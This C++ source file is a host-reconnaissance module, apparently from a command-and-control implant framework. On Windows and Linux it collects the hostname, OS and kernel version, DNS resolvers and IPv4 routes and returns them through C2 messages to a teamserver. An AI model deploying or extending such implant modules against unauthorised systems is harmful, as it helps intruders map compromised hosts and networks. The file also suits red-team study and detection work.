#include "HostContext.hpp"
#include "Common.hpp"

#include <algorithm>
#include <string_view>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <memory>
#else
#include <fstream>
#include <sstream>
#include <sys/utsname.h>
#include <unistd.h>
#endif

namespace
{
constexpr std::string_view moduleName = "hostContext";
constexpr unsigned long long moduleHash = djb2(moduleName);
constexpr int ERROR_HOST_IDENTITY = 1;

#ifdef _WIN32
std::string ipv4FromNetworkOrder(DWORD address)
{
    const auto* octets = reinterpret_cast<const unsigned char*>(&address);
    return std::to_string(octets[0]) + '.' + std::to_string(octets[1]) + '.'
        + std::to_string(octets[2]) + '.' + std::to_string(octets[3]);
}

bool appendWindowsVersion(std::string& output)
{
    using RtlGetVersionFn = LONG (WINAPI*)(OSVERSIONINFOW*);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto rtlGetVersion = ntdll ? reinterpret_cast<RtlGetVersionFn>(GetProcAddress(ntdll, "RtlGetVersion")) : nullptr;
    output += "OS: Windows NT";
    if (!rtlGetVersion)
    {
        output += " (version unavailable)\nKernel: Windows NT (version unavailable)\n";
        return false;
    }
    OSVERSIONINFOW version{};
    version.dwOSVersionInfoSize = sizeof(version);
    if (rtlGetVersion(&version) != 0)
    {
        output += " (version unavailable)\nKernel: Windows NT (version unavailable)\n";
        return false;
    }
    const std::string release = std::to_string(version.dwMajorVersion) + '.'
        + std::to_string(version.dwMinorVersion) + " build " + std::to_string(version.dwBuildNumber);
    SYSTEM_INFO system{};
    GetNativeSystemInfo(&system);
    std::string architecture = "unknown architecture";
    switch (system.wProcessorArchitecture)
    {
    case PROCESSOR_ARCHITECTURE_AMD64: architecture = "x64"; break;
    case PROCESSOR_ARCHITECTURE_INTEL: architecture = "x86"; break;
    case PROCESSOR_ARCHITECTURE_ARM64: architecture = "arm64"; break;
    }
    output += ' ' + release + "\nKernel: Windows NT " + release + ' ' + architecture + '\n';
    return true;
}

void appendWindowsResolver(std::string& output)
{
    output += "Resolver configuration:\n";
    ULONG size = 0;
    DWORD status = GetNetworkParams(nullptr, &size);
    if (status != ERROR_BUFFER_OVERFLOW || size == 0 || size > 4 * 1024 * 1024)
    {
        output += "unavailable\n";
        return;
    }
    auto buffer = std::make_unique<BYTE[]>(size);
    auto* info = reinterpret_cast<FIXED_INFO*>(buffer.get());
    if (GetNetworkParams(info, &size) != NO_ERROR)
    {
        output += "unavailable\n";
        return;
    }
    unsigned count = 0;
    for (const IP_ADDR_STRING* dns = &info->DnsServerList; dns && count < 16; dns = dns->Next)
    {
        if (dns->IpAddress.String[0] == '\0') continue;
        output += "nameserver ";
        output += dns->IpAddress.String;
        output += '\n';
        ++count;
    }
    if (count == 0) output += "no nameserver entries\n";
}

void appendWindowsRoutes(std::string& output)
{
    output += "IPv4 routes:\n";
    ULONG size = 0;
    DWORD status = GetIpForwardTable(nullptr, &size, TRUE);
    if (status != ERROR_INSUFFICIENT_BUFFER || size == 0 || size > 4 * 1024 * 1024)
    {
        output += "unavailable\n";
        return;
    }
    auto buffer = std::make_unique<BYTE[]>(size);
    auto* table = reinterpret_cast<MIB_IPFORWARDTABLE*>(buffer.get());
    if (GetIpForwardTable(table, &size, TRUE) != NO_ERROR)
    {
        output += "unavailable\n";
        return;
    }
    const DWORD count = (std::min)(table->dwNumEntries, 64UL);
    for (DWORD index = 0; index < count; ++index)
    {
        const auto& route = table->table[index];
        output += "interface=" + std::to_string(route.dwForwardIfIndex)
            + " destination=" + ipv4FromNetworkOrder(route.dwForwardDest)
            + " mask=" + ipv4FromNetworkOrder(route.dwForwardMask)
            + " gateway=" + ipv4FromNetworkOrder(route.dwForwardNextHop)
            + " metric=" + std::to_string(route.dwForwardMetric1) + '\n';
    }
    if (count == 0) output += "no IPv4 routes\n";
}
#else
std::string trim(std::string value)
{
    const auto first = value.find_first_not_of(" \t\r\n");
    if (first == std::string::npos) return {};
    const auto last = value.find_last_not_of(" \t\r\n");
    return value.substr(first, last - first + 1);
}

std::string osName()
{
    std::ifstream file("/etc/os-release");
    std::string line;
    while (std::getline(file, line))
    {
        if (line.rfind("PRETTY_NAME=", 0) != 0) continue;
        std::string value = trim(line.substr(12));
        if (value.size() >= 2 && value.front() == '"' && value.back() == '"')
            value = value.substr(1, value.size() - 2);
        return value;
    }
    return "unavailable";
}

std::string ipv4FromProcHex(const std::string& hex)
{
    if (hex.size() != 8) return "unknown";
    try
    {
        const unsigned long value = std::stoul(hex, nullptr, 16);
        return std::to_string(value & 0xffUL) + '.'
            + std::to_string((value >> 8) & 0xffUL) + '.'
            + std::to_string((value >> 16) & 0xffUL) + '.'
            + std::to_string((value >> 24) & 0xffUL);
    }
    catch (...)
    {
        return "unknown";
    }
}

void appendResolver(std::string& output)
{
    std::ifstream file("/etc/resolv.conf");
    output += "Resolver configuration:\n";
    if (!file) { output += "unavailable\n"; return; }
    std::string line;
    unsigned count = 0;
    while (count < 16 && std::getline(file, line))
    {
        line = trim(line);
        if (line.rfind("nameserver ", 0) != 0 && line.rfind("search ", 0) != 0
                && line.rfind("domain ", 0) != 0) continue;
        output += line.substr(0, 256) + '\n';
        ++count;
    }
    if (count == 0) output += "no nameserver/search entries\n";
}

void appendRoutes(std::string& output)
{
    std::ifstream file("/proc/net/route");
    output += "IPv4 routes:\n";
    if (!file) { output += "unavailable\n"; return; }
    std::string line;
    std::getline(file, line); // header
    unsigned count = 0;
    while (count < 64 && std::getline(file, line))
    {
        std::istringstream fields(line);
        std::string iface, destination, gateway, flags, refcnt, use, metric, mask;
        if (!(fields >> iface >> destination >> gateway >> flags >> refcnt >> use >> metric >> mask))
            continue;
        output += iface.substr(0, 64) + " destination=" + ipv4FromProcHex(destination)
            + " mask=" + ipv4FromProcHex(mask)
            + " gateway=" + ipv4FromProcHex(gateway)
            + " metric=" + metric.substr(0, 16) + '\n';
        ++count;
    }
    if (count == 0) output += "no IPv4 routes\n";
}
#endif
}

#ifdef _WIN32
extern "C" __declspec(dllexport) HostContext* HostContextConstructor() { return new HostContext(); }
#else
extern "C" __attribute__((visibility("default"))) HostContext* HostContextConstructor() { return new HostContext(); }
#endif

HostContext::HostContext()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

HostContext::~HostContext() = default;

std::string HostContext::getInfo()
{
#ifdef BUILD_TEAMSERVER
    return "hostContext:\nRead Windows or Linux hostname, OS, kernel, resolver and IPv4 routes.\n"
        "Usage: hostContext\n";
#else
    return {};
#endif
}

int HostContext::init(std::vector<std::string>& splitCommand, C2Message& message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (splitCommand.size() != 1 || splitCommand[0] != std::string(moduleName))
    {
        message.set_returnvalue("Usage: hostContext");
        return -1;
    }
    message.set_instruction(splitCommand[0]);
#else
    (void)splitCommand;
    (void)message;
#endif
    return 0;
}

int HostContext::process(C2Message& message, C2Message& response)
{
    response.set_instruction(message.instruction());
    int errorCode = 0;
    response.set_returnvalue(collect(errorCode));
    response.set_errorCode(errorCode);
    return 0;
}

int HostContext::errorCodeToMsg(const C2Message& response, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if (response.errorCode() == ERROR_HOST_IDENTITY)
        errorMsg = "Failed to collect host identity and OS information.";
#else
    (void)response;
    (void)errorMsg;
#endif
    return 0;
}

std::string HostContext::collect(int& errorCode) const
{
#ifdef _WIN32
    std::string output = "Hostname: ";
    char hostname[256]{};
    DWORD hostnameSize = sizeof(hostname);
    const bool gotHostname = GetComputerNameExA(ComputerNameDnsHostname, hostname, &hostnameSize) != 0;
    output += gotHostname ? hostname : "unavailable";
    output += '\n';
    const bool gotVersion = appendWindowsVersion(output);
    appendWindowsResolver(output);
    appendWindowsRoutes(output);
    if (!gotHostname && !gotVersion) errorCode = ERROR_HOST_IDENTITY;
    return output;
#else
    std::string output;
    char hostname[256]{};
    const bool gotHostname = gethostname(hostname, sizeof(hostname) - 1) == 0;
    output += "Hostname: ";
    output += gotHostname ? hostname : "unavailable";
    output += '\n';
    struct utsname system{};
    const bool gotKernel = uname(&system) == 0;
    output += "Kernel: ";
    output += gotKernel
        ? std::string(system.sysname) + ' ' + system.release + ' ' + system.machine
        : "unavailable";
    output += "\nOS: " + osName() + '\n';
    appendResolver(output);
    appendRoutes(output);
    if (!gotHostname && !gotKernel) errorCode = ERROR_HOST_IDENTITY;
    return output;
#endif
}
